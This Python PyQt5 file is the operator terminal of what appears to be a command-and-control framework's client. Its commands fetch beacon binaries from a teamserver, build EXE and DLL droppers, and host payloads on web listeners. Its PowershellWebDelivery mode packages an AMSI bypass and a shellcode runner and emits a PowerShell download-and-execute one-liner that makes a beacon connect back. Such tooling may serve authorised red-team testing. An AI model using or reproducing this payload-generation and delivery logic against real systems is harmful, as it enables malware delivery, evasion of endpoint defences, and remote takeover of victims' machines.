import sys
import os
import time
import random
import string 
from threading import Thread, Lock
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *

from grpcClient import *


import sys
sys.path.insert(1, './PowershellWebDelivery/')
import GeneratePowershellLauncher
sys.path.insert(1, './PeDropper/')
import GenerateDropperBinary


class Terminal(QWidget):
    tabPressed = pyqtSignal()
    logFileName=""

    def __init__(self, parent, ip, port, devMode):
        super(QWidget, self).__init__(parent)
        self.layout = QVBoxLayout(self)

        self.grpcClient = GrpcClient(ip, port, devMode)

        self.logFileName="Terminal.log"

        self.editorOutput = QPlainTextEdit()
        self.editorOutput.setFont(QFont("Courier"));
        self.editorOutput.setReadOnly(True)
        self.layout.addWidget(self.editorOutput, 8)

        self.commandEditor = CommandEditor()
        self.layout.addWidget(self.commandEditor, 2)
        self.commandEditor.returnPressed.connect(self.runCommand)


    def __del__(self):
        self.thread.quit()
        self.thread.wait()

    def nextCompletion(self):
        index = self._compl.currentIndex()
        self._compl.popup().setCurrentIndex(index)
        start = self._compl.currentRow()
        if not self._compl.setCurrentRow(start + 1):
            self._compl.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def runCommand(self):
        commandLine = self.commandEditor.displayText()
        self.commandEditor.clearLine()
        self.setCursorEditorAtEnd()

        if commandLine == "":
            line = '\n';
            self.editorOutput.insertPlainText(line)
        else:
            cmdHistoryFile = open('.termHistory', 'a')
            cmdHistoryFile.write(commandLine)
            cmdHistoryFile.write('\n')
            cmdHistoryFile.close()

            logFile = open("./logs/"+self.logFileName, 'a')
            logFile.write('[+] send: \"' + commandLine + '\"')
            logFile.write('\n')
            logFile.close()

            self.commandEditor.setCmdHistory()
            instructions = commandLine.split()
            if len(instructions) < 1:
                return;

            if instructions[0]=="help":
                self.runHelp()

            elif instructions[0]=="Generate" or instructions[0]=="gen":
                self.runGenerate(commandLine, instructions)

            elif instructions[0]=="GenerateAndHost" or instructions[0]=="gah":
                self.runGenerateAndHost(commandLine, instructions)
            
            elif instructions[0]=="Host":
                self.runHost(commandLine, instructions)
            
            else:
                line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
                self.editorOutput.appendHtml(line)
                line = '\n' + "Error: Command Unknown"  + '\n';
                self.editorOutput.insertPlainText(line)

        self.setCursorEditorAtEnd()


    def runHelp(self):
        helpText = getHelpMsg()
        line = '<p style=\"color:orange;white-space:pre\">[+] ' + "help" + '</p>'
        self.editorOutput.appendHtml(line)
        line = '\n' + helpText  + '\n';
        self.editorOutput.insertPlainText(line)


    # Host
    #   Host file hostListenerHash
    def runHost(self, commandLine, instructions):
        if len(instructions) < 3:
            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            helpMsg = """Host:
Host upload a file on the teamserver to be downloaded by a web request from a web listener (http/https):
exemple:
- Host file hostListenerHash"""

            line = '\n' + helpMsg  + '\n';
            self.editorOutput.insertPlainText(line)
            return;

        filePath = instructions[1]
        hostListenerHash = instructions[2]

        commandTeamServer = "infoListener "+hostListenerHash
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if "Error" in result:
            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return        

        results = result.split("\n")
        if len(results)<4:
            return

        schemeDownload = results[0]
        ipDownload = results[1]
        portDownload = results[2]
        downloadPath = results[3]
        if not downloadPath:
            error = "Error: Download listener must be of type http or https."
            self.editorOutput.insertPlainText(error)
            return

        if downloadPath[0]=="/":
            downloadPath = downloadPath[1:]

        # Upload the file and get the path
        try:
            filename = os.path.basename(filePath)
            with open(filePath, mode='rb') as fileDesc:
                payload = fileDesc.read()
        except IOError:
            line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            line = '\n' + "Error: File does not appear to exist." + '\n';
            self.editorOutput.insertPlainText(line)
            return  

        commandTeamServer = "putIntoUploadDir "+hostListenerHash+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if "Error" in result:
            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return  
                
        result =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + filename
        line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
        self.editorOutput.appendHtml(line)
        line = '\n' + result  + '\n';
        self.editorOutput.insertPlainText(line)


    # Generate gen
    #   Generate WindowsExecutable listener exe/dll/service 
    #   Generate MsOfficeMcaro listener
    #   Generate HTMLApplication listener
    #   Generate ...
    def runGenerate(self, commandLine, instructions):
        if len(instructions) < 2:
            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            helpMsg = """Generate:
Generate generate a payload to deploy a beacon and store it on the client:
exemple:
- Generate WindowsExecutable listenerHash exe/dll/service"""
# - Generate MsOfficeMcaro listenerHash
# - Generate HTMLApplication listenerHash

            line = '\n' + helpMsg  + '\n';
            self.editorOutput.insertPlainText(line)
            return; 

        mode = instructions[1]
        
        if mode == "WindowsExecutable":
            if len(instructions) < 3:
                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
                self.editorOutput.appendHtml(line)
                helpMsg = """Generate WindowsExecutable:
Generate WindowsExecutable, generate 2 modules dropper, one EXE and one DLL from the appropriate beacon link to the given listener:
exemple:
- Generate WindowsExecutable listenerHash"""

                line = '\n' + helpMsg  + '\n';
                self.editorOutput.insertPlainText(line)
                return; 

            listener = instructions[2]

            commandTeamServer = "infoListener "+listener
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    

            result = resultTermCommand.result
            if "Error" in result:
                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
                self.editorOutput.appendHtml(line)
                line = '\n' + result  + '\n';
                self.editorOutput.insertPlainText(line)
                return   

            results = result.split("\n")
            if len(results)<4:
                return

            scheme = results[0]
            ip = results[1]
            port = results[2]

            commandTeamServer = "getBeaconBinary "+listener
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

            result = resultTermCommand.result
            if "Error" in result:
                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
                self.editorOutput.appendHtml(line)
                line = '\n' + result  + '\n';
                self.editorOutput.insertPlainText(line)
                return   

            print("Beacon size", len(resultTermCommand.data))
            beaconFilePath = "./BeaconHttp.exe"
            beaconFile = open(beaconFilePath, "wb")
            beaconFile.write(resultTermCommand.data)

            beaconArg = ip+" "+port
            if scheme=="http" or scheme=="https":
                beaconArg = beaconArg+" "+scheme

            # launch PeDropper
            dropperExePath, dropperDllPath = GenerateDropperBinary.generatePayloads(beaconFilePath, beaconArg, "")

            result =  "Dropper EXE path: " + dropperExePath + "\n"
            result += "Dropper DLL path: " + dropperDllPath 
            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            
        # elif mode == "MsOfficeMcaro":
        # elif mode == "HTMLApplication":
        else:
            line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            helpMsg = """Error: Mode not recognised"""

            line = '\n' + helpMsg  + '\n';
            self.editorOutput.insertPlainText(line)
            return;


    # GenerateAndHost gah
    #   GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash
    #   GenerateAndHost cmd listenerHash hostListenerHash
    def runGenerateAndHost(self, commandLine, instructions):
        if len(instructions) < 2:
            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            helpMsg = """GenerateAndHost:
GenerateAndHost generate a playload that is store on the teamserver to be downloaded by a web request from a web listener (http/https):
exemple:
- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash"""

            line = '\n' + helpMsg  + '\n';
            self.editorOutput.insertPlainText(line)
            return;

        mode = instructions[1]

        if mode == "PowershellWebDelivery":
            if len(instructions) < 3:
                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
                self.editorOutput.appendHtml(line)
                PowershellWebDeliveryHelpMsg = """GenerateAndHost PowershellWebDelivery:
Generate a powershell oneliner to download a AMSI bypass and a shellcode runner from a listener. The shellcode runner launch a beacon configured to connect back to the specified listener.
exemple:
- GenerateAndHost PowershellWebDelivery listenerHash
- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash"""

                line = '\n' + PowershellWebDeliveryHelpMsg  + '\n';
                self.editorOutput.insertPlainText(line)
                return;
            
            # should take 2 listeners: 
            #   the http/https listener to download the payload from
            #   one listner for the beacon to connect to
            listenerBeacon = instructions[2]
            if  len(instructions) >= 4:
                listenerDownload = instructions[3]
            else:
                listenerDownload = listenerBeacon

            self.GenerateAndHostPowershellWebDelivery(commandLine, listenerDownload, listenerBeacon)
    
        else:
            line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            helpMsg = """Error: Mode not recognised"""

            line = '\n' + helpMsg  + '\n';
            self.editorOutput.insertPlainText(line)
            return;


    # Implementation de GenerateAndHost PowershellWebDelivery
    def GenerateAndHostPowershellWebDelivery(self, commandLine,  listenerDownload, listenerBeacon):
        commandTeamServer = "infoListener "+listenerDownload
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if "Error" in result:
            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return        

        results = result.split("\n")
        if len(results)<4:
            return

        schemeDownload = results[0]
        ipDownload = results[1]
        portDownload = results[2]
        downloadPath = results[3]
        if not downloadPath:
            error = "Error: Download listener must be of type http or https."
            self.editorOutput.insertPlainText(error)
            return

        if downloadPath[0]=="/":
            downloadPath = downloadPath[1:]

        if  listenerBeacon != listenerDownload:
            commandTeamServer = "infoListener "+listenerBeacon
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    

            result = resultTermCommand.result
            if "Error" in result:
                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
                self.editorOutput.appendHtml(line)
                line = '\n' + result  + '\n';
                self.editorOutput.insertPlainText(line)
                return   

            results = result.split("\n")
            if len(results)<4:
                return

            scheme = results[0]
            ip = results[1]
            port = results[2]
        else:
            scheme=schemeDownload
            ip=ipDownload
            port=portDownload

        commandTeamServer = "getBeaconBinary "+listenerBeacon
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if "Error" in result:
            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return   

        print("Beacon size", len(resultTermCommand.data))
        beaconFilePath = "./BeaconHttp.exe"
        beaconFile = open(beaconFilePath, "wb")
        beaconFile.write(resultTermCommand.data)

        beaconArg = ip+" "+port
        if scheme=="http" or scheme=="https":
            beaconArg = beaconArg+" "+scheme

        # Generate the 2 files
        payloadAmsi, payloadShellcodeRunner = GeneratePowershellLauncher.generatePayloads(beaconFilePath, beaconArg, "")

        # Upload the 2 files and get the path
        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        pathAmsiBypass = downloadPath
        pathAmsiBypass = pathAmsiBypass + filename
        commandTeamServer = "putIntoUploadDir "+listenerDownload+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payloadAmsi.encode("utf-8"))
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if "Error" in result:
            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return  

        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        pathShellcodeRunner = downloadPath
        pathShellcodeRunner = pathShellcodeRunner + filename
        commandTeamServer = "putIntoUploadDir "+listenerDownload+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payloadShellcodeRunner.encode("utf-8"))
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if "Error" in result:
            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
            self.editorOutput.appendHtml(line)
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return  

        # upload the 2 file to the server, get the url to reach them
        # generate the oneliner
        oneLiner = GeneratePowershellLauncher.generateOneLiner(ipDownload, portDownload, scheme, pathAmsiBypass, pathShellcodeRunner)

        line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
        self.editorOutput.appendHtml(line)
        line = '\n' + oneLiner  + '\n';
        self.editorOutput.insertPlainText(line)


    def setCursorEditorAtEnd(self):
        cursor = self.editorOutput.textCursor()
        cursor.movePosition(QTextCursor.End,)
        self.editorOutput.setTextCursor(cursor)


class CommandEditor(QLineEdit):
    tabPressed = pyqtSignal()
    cmdHistory = []
    idx = 0

    def __init__(self, parent=None):
        super().__init__(parent)

        if(os.path.isfile('.termHistory')):
            cmdHistoryFile = open('.termHistory')
            self.cmdHistory = cmdHistoryFile.readlines()
            self.idx=len(self.cmdHistory)-1
            cmdHistoryFile.close()

        QShortcut(Qt.Key_Up, self, self.historyUp)
        QShortcut(Qt.Key_Down, self, self.historyDown)

        self.codeCompleter = CodeCompleter(completerData, self)
        # needed to clear the completer after activation
        self.codeCompleter.activated.connect(self.onActivated)
        self.setCompleter(self.codeCompleter)
        self.tabPressed.connect(self.nextCompletion)

    def nextCompletion(self):
        index = self.codeCompleter.currentIndex()
        self.codeCompleter.popup().setCurrentIndex(index)
        start = self.codeCompleter.currentRow()
        if not self.codeCompleter.setCurrentRow(start + 1):
            self.codeCompleter.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def historyUp(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.idx=max(self.idx-1,0)
            self.setText(cmd.strip())

    def historyDown(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            self.idx=min(self.idx+1,len(self.cmdHistory)-1)
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.setText(cmd.strip())

    def setCmdHistory(self):
        cmdHistoryFile = open('.termHistory')
        self.cmdHistory = cmdHistoryFile.readlines()
        self.idx=len(self.cmdHistory)-1
        cmdHistoryFile.close()

    def clearLine(self):
        self.clear()

    def onActivated(self):
        QTimer.singleShot(0, self.clear)


def getHelpMsg():
    helpText  = "help\n"
    helpText += "Host\n"
    helpText += "Generate\n"
    helpText += "GenerateAndHost\n"
    return helpText


completerData = [
    ('help',[]),
    ('Host',[]),
    ('Generate',[
            ('WindowsExecutable',[]),
             ]),
    ('GenerateAndHost',[
            ('PowershellWebDelivery',[]),
             ]),
]


class CodeCompleter(QCompleter):
    ConcatenationRole = Qt.UserRole + 1

    def __init__(self, data, parent=None):
        super().__init__(parent)
        self.createModel(data)

    def splitPath(self, path):
        return path.split(' ')

    def pathFromIndex(self, ix):
        return ix.data(CodeCompleter.ConcatenationRole)

    def createModel(self, data):
        def addItems(parent, elements, t=""):
            for text, children in elements:
                item = QStandardItem(text)
                data = t + " " + text if t else text
                item.setData(data, CodeCompleter.ConcatenationRole)
                parent.appendRow(item)
                if children:
                    addItems(item, children, data)
        model = QStandardItemModel(self)
        addItems(model, data)
        self.setModel(model)